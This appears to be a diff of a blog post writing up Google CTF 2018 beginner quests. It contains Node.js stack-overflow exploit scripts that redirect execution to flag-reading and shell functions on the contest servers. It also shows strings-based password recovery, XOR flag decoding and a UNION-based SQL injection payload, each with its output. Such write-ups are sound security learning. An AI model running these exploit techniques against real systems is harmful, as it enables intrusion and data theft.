@@ -21,47 +21,93 @@
         <div class="clear"></div>
     </div>
 
-    <div class="container"><h1 id="titletodo">(Title TODO)</h1>
-<p>(Intro TODO)</p>
-<h2 id="gatekeeper">Gatekeeper</h2>
-<p>Only a file named <code>gatekeeper</code> is insize the ZIP attachment, what's it?</p>
-<pre><code>$ file gatekeeper
-gatekeeper: ELF 64-bit LSB shared object, x86-64, [...], not stripped
-$ ./gatekeeper
-/===========================================================================\
-|               Gatekeeper - Access your PC from everywhere!                |
-+===========================================================================+
-[ERROR] Login information missing
-Usage: ./gatekeeper &lt;username&gt; &lt;password&gt;
-</code></pre>
-<p>It's usually a good idea to see what strings are embedded in the binary:</p>
-<pre><code>$ strings gatekeeper
+    <div class="container"><h1 id="stacksmashingatgooglectf2018">Stack Smashing at Google CTF 2018</h1>
+<p>The beginner's quests start to get hard, as a CTF beginner myself, I start to
+have some hard time solving the quests. Hopefully I can still get the cake
+though.</p>
+<p>What cake? Oh, looks like I forgot to mention it, here's the main quest prompt:</p>
+<pre><code>Cakes... Throughout history they are long promised, not often delivered. Are
+they real?
+
 [...]
- ~&gt; Verifying.
-0n3_W4rM
- ~&gt; Incorrect username
-zLl1ks_d4m_T0g_I
-Correct!
+
+Your task, uncover the truth, find the cake and show it to the world. Set the
+truth free.
+
 [...]
-$ ./gatekeeper 0n3_W4rM zLl1ks_d4m_T0g_I
-/===========================================================================\
-|               Gatekeeper - Access your PC from everywhere!                |
-+===========================================================================+
- ~&gt; Verifying.......ACCESS DENIED
- ~&gt; Incorrect password
+
+Your goal is to get the cake in the fridge... Where else would you put cake in
+your smart home?
 </code></pre>
-<p>Finding the fishy strings weren't too hard, but they don't work. After staring
-at the second string a few seconds, it reads <code>I got mad skills</code> backward. Is
-that it?</p>
-<pre><code>$ ./gatekeeper 0n3_W4rM I_g0T_m4d_sk1lLz
-/===========================================================================\
-|               Gatekeeper - Access your PC from everywhere!                |
-+===========================================================================+
- ~&gt; Verifying.......Correct!
-Welcome back!
-CTF{I_g0T_m4d_sk1lLz}
+<p>Alright, let's smash some stacks.</p>
+<h2 id="messageoftheday">Message of The Day</h2>
+<p>After playing around a bit with the binary, I noticed that writting a large
+input when setting new user MOTD would cause <code>SIGSEGV</code>, which smells like
+buffer overflow vulnerability. </p>
+<p>I then disassembled the binary with Hopper Disassembler like before, and found
+that the function that prints the current user MOTD will pass the string into
+<code>printf</code> as first argument. Although this let me easily crash the program, my
+input isn't on the stack at this time, so exploiting this format string
+vulnerability to get the flag is rather difficult.</p>
+<p>It's time to investigate whether buffer overflow can be exploited, I checked
+the disassembly and found the instruction address right after reading user
+input is <code>0x60606173</code>:</p>
+<pre><code>$ gdb motd
+[...]
+
+(gdb) break * 0x60606173
+Breakpoint 1 at 0x60606173
+
+(gdb) run
+[...]
+choice: 2
+Enter new message of the day
+
+New msg: ("A" repeated 0x100 times, the size of the buffer)
+Breakpoint 1, 0x0000000060606173 in set_motd ()
+
+(gdb) x/150xw $sp
+[...]
+0x7ffffffde1c0: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7ffffffde1d0: 0xfffde200      0x00007fff      0x60606373      0x00000000
+[...]
 </code></pre>
-<p>Yep, that's it.</p>
+<p>Looks like I need 8 more characters to reach the return address. A quick
+Node.js script can be used to encode the address of <code>read_flag</code> function,
+<code>0x606063a5</code>:</p>
+<pre><code class="JavaScript language-JavaScript">"use strict";
+
+// Reverse to take care of the endianness
+const read_flag_address = [0x60, 0x60, 0x63, 0xa5].reverse();
+
+let payload = [
+    Buffer.from("2"),
+    Buffer.from("\n"),
+
+    Buffer.from("A".repeat(0x100 + 8)), Buffer.from(read_flag_address),
+    Buffer.from("\n"),
+
+    Buffer.from("5"),
+    Buffer.from("\n"),
+];
+payload = Buffer.concat(payload);
+
+process.stdout.write(payload);
+</code></pre>
+<p>Let's try it:</p>
+<pre><code>$ node exploit | nc motd.ctfcompetition.com 1337
+Choose functionality to test:
+1 - Get user MOTD
+2 - Set user MOTD
+3 - Set admin MOTD (TODO)
+4 - Get admin MOTD
+5 - Exit
+choice: Enter new message of the day
+New msg: New message of the day saved!
+Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
+</code></pre>
+<p>Usually smashing the stack like this would cause <code>SIGABRT</code>, but apparently the
+binary of this quest is compiled without stack cookies.</p>
 <h2 id="adminui2">Admin UI 2</h2>
 <p>It's time to log in using the flag from <a href="Google_CTF_2018_2.html">last time</a>:</p>
 <pre><code>[...]
@@ -152,7 +198,7 @@ Security made us disable the shell, sorry!
 </code></pre>
 <p>Well, looks like I need to find another way. Looking back at the
 <code>secondary_login</code> function, the XOR and the <code>FLAG</code> variables are extra
-suspicious, what's the content of <code>FLAG</code>?</p>
+suspicious. The content of <code>FLAG</code> can be easily read out from disassembly:</p>
 <pre><code class="JavaScript language-JavaScript">"use strict";
 
 const flag = [
@@ -187,80 +233,186 @@ for (const w of flag) {
     }
 }
 </code></pre>
-<p>The content can be easily read out from Hopper Disassembler, but it's not
-readable text. However, it's clearly the flag after XOR-ing each byte with
-<code>0xc7</code>: <code>CTF{Two_PasSworDz_Better_th4n_1_k?}</code>.</p>
+<p>XOR-ing each byte of <code>FLAG</code> with <code>0xc7</code> reveals the flag:
+<code>CTF{Two_PasSworDz_Better_th4n_1_k?}</code>.</p>
 <p>I'm not sure if it's a bug or intentional, but it would make more sense if the
-<code>secondary_login</code> function actually validated the input. <code>shell</code> is disabled,
-but can it be enabled with some hacking?</p>
-<h2 id="messageoftheday">Message of The Day</h2>
-<p>After playing around a bit with the binary, I noticed that writting a large
-input when setting new user MOTD would cause <code>SIGSEGV</code>, which smells like
-buffer overflow vulnerability. </p>
-<p>I then disassembled the binary with Hopper Disassembler like before, and found
-that the function that prints the current user MOTD will pass the string into
-<code>printf</code> as first argument. Although this let me easily crash the program, my
-input isn't on the stack, so exploiting this format string vulnerability to
-get the flag is rather difficult.</p>
-<p>It's time to investigate whether buffer overflow can be exploited, I checked
-the disassembly and found the instruction address right after reading user
-input is <code>0x60606173</code>:</p>
-<pre><code>$ gdb motd
-[...]
-
-(gdb) break * 0x60606173
-Breakpoint 1 at 0x60606173
-
-(gdb) run
-[...]
-choice: 2
-Enter new message of the day
-
-New msg: ("A" repeated 0x100 times, the size of the buffer)
-Breakpoint 1, 0x0000000060606173 in set_motd ()
-
-(gdb) x/150xw $sp
-[...]
-0x7ffffffde1c0: 0x41414141      0x41414141      0x41414141      0x41414141
-0x7ffffffde1d0: 0xfffde200      0x00007fff      0x60606373      0x00000000
-[...]
-</code></pre>
-<p>Looks like I need 8 more characters to reach the return address. A quick
-Node.js script can be used to encode the address of <code>read_flag</code> function,
-<code>0x606063a5</code>:</p>
+<code>secondary_login</code> function actually validated the input. Anyway, <code>shell</code> is
+still disabled, can it be enabled with some hacks?</p>
+<h2 id="adminui3">Admin UI 3</h2>
+<p>After checking the disassembly, I found that the buffer holding the input
+command is 48 bytes long. Writting something very big will not crash the
+program right away, that's because the current function doesn't return until
+the <code>quit</code> command is received. After entering <code>quit</code>, the program gets
+<code>SIGSEGV</code> (not <code>SIGABRT</code>). Looks like I can smash the stack and redirect code
+execution again.</p>
+<p>Examining the symbols, the <code>debug_shell</code> function is the one that handles
+the <code>shell</code> command (when it's enabled), following the same logic as Message
+of The Day quest:</p>
 <pre><code class="JavaScript language-JavaScript">"use strict";
 
-// Reverse to take care of the endianness
-const read_flag_address = [0x60, 0x60, 0x63, 0xa5].reverse();
+const shell_address = [0x41, 0x41, 0x42, 0x27].reverse();
 
 let payload = [
-    Buffer.from("2"),
+    Buffer.from("1"),
     Buffer.from("\n"),
 
-    Buffer.from("A".repeat(0x108)), Buffer.from(read_flag_address),
+    Buffer.from("CTF{I_luv_buggy_sOFtware}"),
     Buffer.from("\n"),
 
-    Buffer.from("5"),
+    Buffer.from("a".repeat(35)),
+    Buffer.from("\n"),
+
+    Buffer.from("A".repeat(48 + 8)), Buffer.from(shell_address),
+    Buffer.from("\n"),
+
+    Buffer.from("quit"),
+    Buffer.from("\n"),
+
+    Buffer.from("ls -al"),
+    Buffer.from("\n"),
+
+    Buffer.from("exit"),
     Buffer.from("\n"),
 ];
 payload = Buffer.concat(payload);
 
 process.stdout.write(payload);
 </code></pre>
-<p>Let's try it:</p>
-<pre><code>$ node exploit | nc motd.ctfcompetition.com 1337
-Choose functionality to test:
-1 - Get user MOTD
-2 - Set user MOTD
-3 - Set admin MOTD (TODO)
-4 - Get admin MOTD
-5 - Exit
-choice: Enter new message of the day
-New msg: New message of the day saved!
-Admin MOTD is: CTF{m07d_1s_r3t_2_r34d_fl4g}
+<p>Run it:</p>
+<pre><code>$ node exploit | nc mngmnt-iface.ctfcompetition.com 1337
+=== Management Interface ===
+ 1) Service access
+ 2) Read EULA/patch notes
+ 3) Quit
+Please enter the backdoo^Wservice password:
+! Two factor authentication required !
+Please enter secret secondary password:
+Authenticated
+&gt; Unknown command 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'BAA'
+&gt; Bye!
+total 144
+drwxr-xr-x 3 user   user      4096 Jun 18 08:25 .
+drwxr-xr-x 3 nobody nogroup   4096 May 25 13:19 ..
+-rw-r--r-- 1 user   user       220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 user   user      3771 Aug 31  2015 .bashrc
+-rw-r--r-- 1 user   user       655 May 16  2017 .profile
+-rw-r--r-- 1 nobody nogroup     26 May 24 15:03 an0th3r_fl44444g_yo
+-rw-r--r-- 1 nobody nogroup     25 Jun 18 08:25 flag
+-rwxr-xr-x 1 nobody nogroup 111128 Jun 18 08:25 main
+drwxr-xr-x 2 nobody nogroup   4096 Jun 18 08:25 patchnotes
 </code></pre>
-<p>Usually smashing the stack like this would cause <code>SIGABRT</code>, but apparently the
-binary of this quest is compiled without stack cookies.</p></div>
+<p>Looks like I found what I'm looking for:</p>
+<pre><code class="JavaScript language-JavaScript">// [...]
+
+    Buffer.from("cat an0th3r_fl44444g_yo"),
+    Buffer.from("\n"),
+
+// [...]
+</code></pre>
+<p>And the third flag is <code>CTF{c0d3ExEc?W411_pL4y3d}</code>.</p>
+<h2 id="gatekeeper">Gatekeeper</h2>
+<p>Only a file named <code>gatekeeper</code> is insize the ZIP attachment, what's it?</p>
+<pre><code>$ file gatekeeper
+gatekeeper: ELF 64-bit LSB shared object, x86-64, [...], not stripped
+$ ./gatekeeper
+/===========================================================================\
+|               Gatekeeper - Access your PC from everywhere!                |
++===========================================================================+
+[ERROR] Login information missing
+Usage: ./gatekeeper &lt;username&gt; &lt;password&gt;
+</code></pre>
+<p>It's usually a good idea to see what strings are embedded in the binary:</p>
+<pre><code>$ strings gatekeeper
+[...]
+ ~&gt; Verifying.
+0n3_W4rM
+ ~&gt; Incorrect username
+zLl1ks_d4m_T0g_I
+Correct!
+[...]
+$ ./gatekeeper 0n3_W4rM zLl1ks_d4m_T0g_I
+/===========================================================================\
+|               Gatekeeper - Access your PC from everywhere!                |
++===========================================================================+
+ ~&gt; Verifying.......ACCESS DENIED
+ ~&gt; Incorrect password
+</code></pre>
+<p>Finding the fishy strings weren't too hard, but they don't work. After staring
+at the second string a few seconds, it reads <code>I got mad skills</code> backward. Is
+that it?</p>
+<pre><code>$ ./gatekeeper 0n3_W4rM I_g0T_m4d_sk1lLz
+/===========================================================================\
+|               Gatekeeper - Access your PC from everywhere!                |
++===========================================================================+
+ ~&gt; Verifying.......Correct!
+Welcome back!
+CTF{I_g0T_m4d_sk1lLz}
+</code></pre>
+<p>Yep, that's it.</p>
+<h2 id="mediadb">Media-DB</h2>
+<p>The source code of the server is attached, let's have a look:</p>
+<pre><code class="Python language-Python"># [...]
+c.execute("CREATE TABLE oauth_tokens (oauth_token text)")
+c.execute("CREATE TABLE media (artist text, song text)")
+c.execute("INSERT INTO oauth_tokens VALUES ('{}')".format(flag))
+# [...]
+  if choice == '1':
+    my_print("artist name?")
+    artist = raw_input().replace('"', "")
+    my_print("song name?")
+    song = raw_input().replace('"', "")
+    c.execute("""INSERT INTO media VALUES ("{}", "{}")""".format(artist, song))
+  elif choice == '2':
+    my_print("artist name?")
+    artist = raw_input().replace("'", "")
+    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
+  elif choice == '3':
+    my_print("song name?")
+    song = raw_input().replace("'", "")
+    print_playlist("SELECT artist, song FROM media WHERE song = '{}'".format(song))
+  elif choice == '4':
+    artist = random.choice(list(c.execute("SELECT DISTINCT artist FROM media")))[0]
+    my_print("choosing songs from random artist: {}".format(artist))
+    print_playlist("SELECT artist, song FROM media WHERE artist = '{}'".format(artist))
+# [...]
+</code></pre>
+<p>It's clearly SQL Injection vulnerability, but quotes are removed and <code>\n</code> would
+mark the end of input. I tried a few classic SQL Injection payloads but nothing
+worked. Examining the source code closely, I noticed the removed quotes in
+choice 1 is <code>"</code> but it's <code>'</code> in choices 2 ad 3. Choice 4 doesn't escape quotes,
+but the artist must be already in the database.</p>
+<p>After playing around with it a bit, I noticed I can have <code>'</code> in artist name,
+which is later not escaped in choice 4. It's time to craft a query that would
+print the flag:</p>
+<pre><code class="SQL language-SQL">SELECT artist, song FROM media WHERE artist = '' UNION SELECT 'flag', oauth_token FROM oauth_tokens
+</code></pre>
+<p>Putting into classic SQL Injection format:</p>
+<pre><code>' UNION SELECT 'flag', oauth_token FROM oauth_tokens; --
+</code></pre>
+<p>Let's try it:</p>
+<pre><code>$ nc media-db.ctfcompetition.com 1337
+=== Media DB ===
+1) add song
+2) play artist
+3) play song
+4) shuffle artist
+5) exit
+&gt; 1
+artist name?
+' UNION SELECT 'flag', oauth_token FROM oauth_tokens; --
+song name?
+b
+
+[...]
+&gt; 4
+choosing songs from random artist: ' UNION SELECT 'flag', oauth_token FROM oauth_tokens; --
+
+== new playlist ==
+1: "CTF{fridge_cast_oauth_token_cahn4Quo}
+" by "flag"
+</code></pre>
+<h2 id="imclose">I'm Close!</h2>
+<p>I'm almost done the beginner's quests! Hopefully I can see my cakes next time.</p></div>
 
     <div class="container footer">
         <p>By Hugo Xu (@jspenguin2017)</p>
